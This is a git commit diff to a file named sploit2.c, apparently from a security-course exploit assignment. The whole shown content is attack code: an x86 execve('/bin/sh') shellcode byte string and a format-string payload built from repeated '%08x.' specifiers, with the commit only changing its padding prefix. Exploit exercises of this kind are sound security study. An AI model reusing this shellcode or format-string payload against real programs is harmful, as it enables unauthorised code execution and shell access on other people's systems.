f5d4a3b50a382385719fa5c5f5f149675f6bfbf2
shangzw <shangzw12@163.com>
2016-10-05 11:11:05 -0400

    -

--- s2/sploit2.c
+++ s2/sploit2.c
@@ -7,7 +7,7 @@ int main(){
 	int count = 130;
 	int p_cmd_len = 0;
   	char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
-	char p_cmd[] = "P1234"
+	char p_cmd[] = "P123456789"
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
 			"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x."
